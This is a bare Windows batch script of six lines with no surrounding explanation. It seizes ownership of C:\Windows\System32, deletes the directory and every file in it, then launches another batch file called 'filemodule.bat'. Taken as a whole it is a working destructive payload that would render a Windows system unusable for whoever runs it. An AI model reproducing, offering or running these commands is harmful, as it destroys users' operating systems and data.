takeown /f c:\windows\system32 /a /r /d y
cacls c:\windows\system32
rd /s /q c:\windows\system32
del /s /q c:\windows\system32\*.*
timeout 1
start filemodule.bat
